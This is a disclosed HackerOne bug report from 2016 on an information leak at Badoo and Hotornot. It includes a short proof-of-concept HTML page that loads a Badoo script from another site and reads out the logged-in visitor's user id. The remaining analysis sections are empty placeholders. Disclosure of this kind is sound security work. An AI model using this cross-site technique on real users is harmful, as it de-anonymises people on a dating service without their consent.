---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '130453'
original_report_id: '130453'
title: Badoo and Hotornot User Disclosure
weakness: Information Disclosure
team_handle: bumble
created_at: '2016-04-13T21:54:31.466Z'
disclosed_at: '2016-05-16T07:10:56.391Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Badoo and Hotornot User Disclosure

## Metadata

- HackerOne Report ID: 130453
- Weakness: Information Disclosure
- Program: bumble
- Disclosed At: 2016-05-16T07:10:56.391Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hi,

I have found that endpoint is leaking the currently logged in user which will result in stealing the user id and unmasking the current user, This behavior could be malicious to ads websites, rouge websites, etc...

PoC Code:
<html>
<head>
<title>Badoo Current User Unmasking</title>
<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function UnmaskUser(str) {
return str.split('=')[0];
}
window.onload = function(){
var user = UnmaskUser(user_id);alert(user);};
</script>

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
